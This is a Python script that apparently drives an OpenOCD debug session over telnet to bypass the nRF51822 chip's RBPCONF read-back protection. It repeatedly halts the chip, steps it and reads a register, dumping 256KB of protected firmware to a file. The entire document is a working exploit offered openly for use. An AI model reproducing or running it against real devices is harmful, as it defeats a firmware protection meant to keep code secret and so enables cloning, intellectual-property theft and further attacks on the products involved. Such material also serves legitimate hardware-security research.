#!/usr/bin/env python3

import telnetlib
import time
from pwn import *

tn = telnetlib.Telnet("127.0.0.1", 4444)
f = open("firm_dump.bin", "ab")
print("\n  nRF51822 RBPCONF bypass script ;)")
print("  Dumping firmware\n\n")

for x in range(0, 262144, 4): #reading 256KB of firmware
#for x in range(0, 64, 4):
  tn.read_until(b">")

  tn.write(b"reset halt\n")
  tn.read_until(b">")
  tn.write(b"step\n")
  tn.read_until(b">")
  tn.write(b"reg r3 " + bytes(str(x).encode('ascii')) + b"\n")
  tn.read_until(b">")
  tn.write(b"step\n")
  tn.read_until(b">")
  tn.write(b"reg r3\n")

  leak = tn.read_until(b">").replace(b"\r\n\r\n\r>", b"").replace(b" reg r3\r\nr3 (/32): ", b"").replace(b"0x", b"")
#  print(leak)
  print("     [" + hex(x) + "]  -  " +  hex(int(leak, 16)))
  leak_le = int(leak, 16)

  f.write(p32(leak_le))
  tn.write(b"reset halt\n")
f.close()
print("  Firmware dumped successfully")
tn.close()
